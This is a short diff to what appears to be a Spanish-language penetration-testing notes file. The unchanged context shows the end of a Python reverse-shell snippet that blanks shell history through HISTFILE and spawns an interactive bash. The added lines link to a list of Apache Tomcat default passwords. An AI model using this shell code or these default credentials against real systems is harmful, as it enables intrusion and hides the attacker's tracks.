@@ -409,3 +409,7 @@ os.putenv("HISTFILE",'/dev/null')
 pty.spawn("/bin/bash")
 s.close()
 -------------
+
+--------------------- Enlaces de interes
+
+https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown (Tomcat default credentials)
